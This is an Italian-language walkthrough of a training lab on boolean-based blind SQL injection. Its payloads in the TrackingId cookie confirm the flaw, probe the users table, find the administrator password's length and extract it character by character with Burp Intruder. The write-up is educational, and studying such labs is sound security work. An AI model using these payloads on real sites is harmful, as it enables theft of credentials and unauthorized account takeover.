Lab: Blind SQL injection with conditional responses

üìù Descrizione

Il lab presenta una vulnerabilit√† di blind SQL injection nel valore del cookie TrackingId, usato dal sito per finalit√† analitiche.
Sebbene i risultati delle query non vengano mostrati direttamente e non compaiano errori, la pagina rivela un messaggio "Welcome back" quando la query SQL sottostante restituisce almeno una riga.
Questo comportamento consente di eseguire un attacco boolean-based blind SQLi, sfruttando differenze di risposta per dedurre la presenza di dati, lunghezza della password e valori carattere per carattere.

‚öôÔ∏è Passaggi eseguiti

1. Individuazione del punto vulnerabile
Intercettata con Burp Suite la richiesta HTTP con il cookie:

Cookie: TrackingId=xyz; session=...

2. Test base booleani
Iniettato payload valido:

TrackingId=xyz' AND '1'='1
‚ûú La pagina mostra ‚ÄúWelcome back‚Äù.

Iniettato payload falso:

TrackingId=xyz' AND '1'='2
‚ûú Il messaggio scompare.

‚úÖ Conferma della vulnerabilit√† blind SQLi.

3. Verifica presenza tabella users e utente administrator
Test esistenza della tabella users:

TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
‚ûú "Welcome back" presente ‚Üí tabella esiste.

Test presenza utente administrator:

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
‚ûú Conferma che l‚Äôutente esiste.

4. Determinazione lunghezza password
Test sequenziali con operatori LENGTH e >:

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
‚ûú ‚ÄúWelcome back‚Äù presente

Aumentato progressivamente il valore fino a:

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a
‚ûú ‚ÄúWelcome back‚Äù scompare ‚Üí Password lunga esattamente 20 caratteri.

5. Estrazione password con Burp Intruder

Usato payload: TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a

Posizionato marker su 'a': TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='¬ßa¬ß

In Intruder:
-Tipo di payload: Simple list
-Caratteri testati: a-z, 0-9
-Grep Match: Welcome back

Ripetuto l‚Äôattacco variando l‚Äôoffset SUBSTRING(password,N,1) da 1 a 20.

üß† Ragionamento tecnico

In una blind SQL injection boolean-based, l‚Äôattaccante non vede i risultati della query, ma pu√≤ inferire informazioni sfruttando differenze nel comportamento dell'applicazione.
In questo caso, la presenza del messaggio "Welcome back" √® stata sfruttata come segnale booleano (true/false) per:

-Confermare esistenza di dati
-Calcolare la lunghezza della password
-Estrarre caratteri uno alla volta usando SUBSTRING()

Questo approccio √® lento ma potente, e pu√≤ essere automatizzato con strumenti come Burp Intruder.

‚úÖ Soluzione finale

Determinata lunghezza della password: 20 caratteri

Estratti i caratteri uno per uno con payload tipo: TrackingId=xyz' AND (SELECT SUBSTRING(password,3,1) FROM users WHERE username='administrator')='c
Ricostruita la password completa.

Usata per accedere con:

Username: administrator

Password: (valore trovato)

